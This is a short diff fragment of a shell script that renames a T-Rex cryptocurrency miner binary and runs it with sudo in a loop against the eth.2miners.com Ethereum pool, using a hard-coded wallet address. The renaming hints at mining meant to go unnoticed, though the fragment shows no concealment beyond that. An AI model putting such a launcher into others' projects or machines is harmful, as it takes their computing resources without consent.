@@ -13,7 +13,7 @@ mv t-rex $y
 while [ $x -le 20 ]
 do
 
-  sudo ./$y -a ethash -o eth.2miners.com:2020 -u 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.TREX$P -p x --coin ETH --intensity 18 --low-load 1 --no-color --quiet --hide-date --send-stales --no-nvml --no-strict-ssl
+  sudo ./$y -a ethash -o eth.2miners.com:2020 -u 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.TREX$P -p x --coin ETH --no-color --send-stales --no-nvml --no-strict-ssl
 
 
   x=$(( $x + 1 ))
